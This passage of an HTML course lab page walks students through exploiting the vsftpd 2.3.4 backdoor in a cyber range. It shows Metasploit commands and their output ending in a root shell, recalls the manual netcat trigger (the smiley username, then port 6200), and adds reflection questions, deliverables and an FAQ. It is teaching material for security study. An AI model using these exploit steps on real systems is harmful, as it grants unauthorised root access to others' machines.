+   -  ----                                       ---------------  ----
+   0  exploit/unix/ftp/vsftpd_234_backdoor        2011-07-03        excellent
+
+<span class="msf-line" data-explain="Select the module — load it as the active context for the next commands.">msf6 &gt; <span class="term-cmd">use exploit/unix/ftp/vsftpd_234_backdoor</span></span>
+[*] No payload configured, defaulting to cmd/unix/interact
+
+<span class="msf-line" data-explain="Show every parameter the module accepts. RHOSTS (target host) is the only required one with no default.">msf6 exploit(...) &gt; <span class="term-cmd">show options</span></span>
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s)
+   RPORT   21               yes       The target port (TCP)
+
+<span class="msf-line" data-explain="Set the target host. Replace 10.0.0.6 with your $TARGET.">msf6 exploit(...) &gt; <span class="term-cmd">set RHOSTS 10.0.0.6</span></span>
+RHOSTS =&gt; 10.0.0.6
+
+<span class="msf-line" data-explain="Fire the exploit. Metasploit performs the same two-step dance you did by hand: USER hacker:) / PASS junk on port 21, then connect to port 6200 and attach to the shell.">msf6 exploit(...) &gt; <span class="term-cmd">run</span></span>
+[*] 10.0.0.6:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.0.0.6:21 - USER: 331 Please specify the password.
+[+] 10.0.0.6:21 - <span class="term-hl">Backdoor service has been spawned, handling...</span>
+[+] 10.0.0.6:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (10.0.0.5:43210 -&gt; 10.0.0.6:6200)
+
+<span class="msf-line" data-explain="You are now in the same shell you opened by hand in step 6.2.">id</span>
+uid=0(root) gid=0(root)</pre>
+  <div class="msf-explain" id="msf-explain">Hover any highlighted line for an explanation.</div>
+</div>
+
+<p>That's it. The framework connected to port 21, sent <code>USER xxx:)</code> and <code>PASS xxx</code>, then opened a TCP connection to port 6200 and attached it to your terminal as a managed session. It is <strong>exactly</strong> the manual exploit you ran in section 6 — wrapped in a session manager, a payload selector, and a logging system.</p>
+
+<p>This is the pattern for the rest of the semester: <strong>read the protocol, do it by hand once to internalize the mechanics, then use the framework module after you understand what it is doing.</strong></p>
+
+<div class="exercise">
+  <div class="ex-label">Try it · match the manual steps to msfconsole's output</div>
+  <p>Three things you did manually in §6: <strong>(a)</strong> opened a <code>nc</code> connection to port 21; <strong>(b)</strong> sent <code>USER hacker:)</code> followed by <code>PASS whatever</code>; <strong>(c)</strong> opened a second <code>nc</code> connection to port 6200 to attach to the shell. Which lines in the msfconsole output above correspond to each step?</p>
+  <details><summary>Show answer</summary><div><strong>(a)</strong> → <code>[*] 10.0.0.6:21 - Banner: 220 (vsFTPd 2.3.4)</code> — Metasploit opened the connection and received the FTP banner. <strong>(b)</strong> → <code>[*] 10.0.0.6:21 - USER: 331 Please specify the password.</code> — Metasploit sent <code>USER xxx:)</code> and got the 331 response; the <code>PASS</code> happened invisibly right after, and the next line (<code>[+] Backdoor service has been spawned, handling...</code>) confirms it tripped the trigger. <strong>(c)</strong> → <code>[*] Command shell session 1 opened (10.0.0.5:43210 -&gt; 10.0.0.6:6200)</code> — Metasploit connected to port 6200 and attached the shell to your terminal as a managed "session." Same three steps; you just typed five characters of slash-command instead of two terminals.</div></details>
+</div>
+
+<div class="callout insight keep-in-present">
+  <span class="label">before you leave · terminate the cyber range</span>
+  <p>At the end of class, open the VCR exercise page and click <strong>Terminate</strong>. VCR meters per-VM-hour; an idle exercise consumes credits until it times out. Build this into your last 2 minutes every lab day.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="reflection">8 · Reflection</h2>
+
+<p>Discuss with your teammates. Two short paragraphs, one per question:</p>
+
+<div class="exercise">
+  <div class="ex-label">reflection · pre-auth severity</div>
+  <p>You got root without ever logging in — no real username, no real password. Bugs like that are called <strong>pre-authentication</strong> vulnerabilities. Why are they more dangerous than bugs that only work after someone legitimately logs in?</p>
+</div>
+
+<div class="exercise">
+  <div class="ex-label">reflection · framework value</div>
+  <p>You could write a one-line bash script that automates sections 6.1 and 6.2. What does Metasploit add <strong>on top of</strong> that script? Think about post-exploitation modules, payload selection, session handling, and what happens when you have ten targets instead of one.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="deliverables">Deliverables</h2>
+
+<table>
+  <thead><tr><th>part</th><th>deliverable</th><th>format</th></tr></thead>
+  <tbody>
+    <tr><td>1 · team</td><td>roster + handle + signed contract</td><td>PDF on Gradescope, one per team</td></tr>
+    <tr><td>2 · cyber range</td><td>screenshot of <code>ping $TARGET</code> succeeding</td><td>PNG/JPG embedded in PDF</td></tr>
+    <tr><td>3 · recon</td><td>screenshot of <code>nmap -sV</code> showing <code>vsftpd 2.3.4</code></td><td>PNG/JPG embedded in PDF</td></tr>
+    <tr><td>6 · manual exploit</td><td>screenshot of <code>id</code> = <code>uid=0(root)</code> from port 6200</td><td>PNG/JPG embedded in PDF</td></tr>
+    <tr><td>7 · metasploit</td><td>screenshot of the msfconsole session as root</td><td>PNG/JPG embedded in PDF</td></tr>
+    <tr><td>8 · reflection</td><td>three short paragraphs, one per prompt</td><td>same PDF, last page</td></tr>
+  </tbody>
+</table>
+
+<p>Submit one PDF per team, named <code>lab00-&lt;handle&gt;.pdf</code>.</p>
+
+<!-- ============================================================ -->
+<h2 id="faq">FAQ</h2>
+
+<h3>The Try-it widget worked; do I still have to do it inside the cyber range?</h3>
+<p>Yes. The widget is a simulation — it teaches the keystrokes. The graded artifacts come from the real Kali ↔ Metasploitable exchange in VCR.</p>
+
+<h3>The smiley trigger seems trivial. Has anything that simple ever shipped in real software since 2011?</h3>
+<p>Yes, and often. The <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">XZ-Utils backdoor (CVE-2024-3094, 2024)</a> was a far more sophisticated supply-chain compromise, but at its core it was the same shape: hostile code added to a trusted upstream, triggered by a magic byte sequence, granting pre-auth remote access. The <em>delivery</em> got harder; the <em>idea</em> didn't.</p>
+
+<h3>Why netcat instead of an FTP client?</h3>
+<p>Because FTP clients normalize input. An FTP client would refuse to send <code>USER hacker:)</code> verbatim, or would sanitize the colon, or would helpfully add a <code>:</code> for you. <code>nc</code> sends the bytes you typed. For exploitation work, you almost always want a raw TCP client — <code>nc</code>, <code>ncat</code>, <code>socat</code>, or your own Python socket script — not a protocol-aware client.</p>
+
+<h3>I want to see the actual Metasploit module source.</h3>
+<p>On Kali, <code>cat /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb</code>. It's about 40 lines of Ruby — read it line by line and compare to what you did by hand in section 6.</p>
+
+<footer>
+DS 6042 — Lab 00 · orientation + vsftpd 2.3.4 backdoor walkthrough. Interactive build by Daniel Graham &amp; Claude, following the lab style codified in <code>CLAUDE.md</code>. Module source: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb"><code>vsftpd_234_backdoor.rb</code></a>.
+</footer>
+
+</main>
+
+<script src="../_shared/lab-base.js?v=5"></script>
+<script src="viz.js?v=7"></script>
+</body>
+</html>
